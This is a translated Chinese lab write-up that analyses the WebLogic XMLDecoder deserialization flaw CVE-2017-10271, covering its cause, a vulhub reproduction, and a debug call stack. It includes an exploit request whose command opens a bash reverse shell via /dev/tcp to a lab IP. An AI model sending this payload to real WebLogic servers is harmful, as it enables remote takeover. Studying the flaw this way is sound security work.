# CVE-2017-10271——WebLogic-Xml反序列化初探
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、原理
###  （一）概述
WebLogic对POST类型的XML请求未做有效的过滤防范，导致了XMLDecoder反序列化漏洞。
###  （二）CVE-2017-10271
CVE-2017-10271与CVE-2017-3506的漏洞原理是一样的，即WebLogic对恶意的XML请求防范的不够严密。
###  （三）原理
**1.原理**
和之前接触过的php的xml注入有点像，
根本成因在于没有对输入的xml做有效的过滤，导致了任意代码执行，故整个流程涉及到两个部分，一是我们输入的xml是怎么进入到反序列化点的，二是payload在反序列化点是怎么导致任意代码执行的。
**2.payload**
网上流传的payload如下，
    POST /wls-wsat/CoordinatorPortType HTTP/1.1
    Host: 192.168.43.64:7001
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: text/xml
    Content-Length: 639
    /bin/bash
    -c
    bash -i &gt;&amp; /dev/tcp/192.168.43.171/6666 0&gt;&amp;1
## 二、调试
###  （一）环境搭建
可以直接使用vulhub的docker进行搭建，这里还是推荐这个良心博客，
[IDEA+docker，进行远程漏洞调试（weblogic） – ph4nt0mer –
博客园](https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html)
###  （二）复现
burp拦截包，改之，
成功执行，得到反向shell。
###  （三）调试
先上完整调用栈，比较深，人为分成几个部分，
    readObject:206, XMLDecoder (java.beans)
    readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
    readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
    receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
    receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
    receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
    processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    __doRun:866, Fiber (com.sun.xml.ws.api.pipe)
    _doRun:815, Fiber (com.sun.xml.ws.api.pipe)
    doRun:778, Fiber (com.sun.xml.ws.api.pipe)
    runSync:680, Fiber (com.sun.xml.ws.api.pipe)
    process:403, WSEndpointImpl$2 (com.sun.xml.ws.server)
    handle:539, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
    handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
    handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
    handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
    run:708, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)
    doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:146, SecurityManager (weblogic.security.service)
    authenticatedInvoke:103, ServerSecurityHelper (weblogic.wsee.util)
    run:311, HttpServletAdapter$3 (weblogic.wsee.jaxws)
    post:336, HttpServletAdapter (weblogic.wsee.jaxws)
    doRequest:99, JAXWSServlet (weblogic.wsee.jaxws)
    service:99, AbstractAsyncServlet (weblogic.servlet.http)
    service:820, HttpServlet (javax.servlet.http)
    run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
    invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)
    execute:301, ServletStubImpl (weblogic.servlet.internal)
    execute:184, ServletStubImpl (weblogic.servlet.internal)
    wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:120, SecurityManager (weblogic.security.service)
    securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)
    execute:2179, WebAppServletContext (weblogic.servlet.internal)
    run:1490, ServletRequestImpl (weblogic.servlet.internal)
    execute:256, ExecuteThread (weblogic.work)
    run:221, ExecuteThread (weblogic.work)
**1.readObj缘何引发命令执行？**
这一小节需要关注的是调用readObject时发生了什么，但也这里不会研究的特别深入，只简单的看下关键点，调用栈的前三段（即怎么进入的readObject）放到下一小节。  
先简单看下Java中xml的结构，来个简单的demo，
    import java.beans.XMLEncoder;
    import java.io.BufferedOutputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    import java.util.HashMap;
    public class DemoOut {
        public static void main(String[] args) throws FileNotFoundException {
            HashMap map = new HashMap<>();
            map.put("arr", new String[3]);
            XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("demo.xml")));
            e.writeObject(map);
            e.close();
        }
    }
得到的demo.xml如下，
       arr
这其中，object标签表示对象；void标签表示函数调用、赋值等操作， 里面的method 属性指定方法名称； array标签表示数组，
里面的class属性指定具体类。  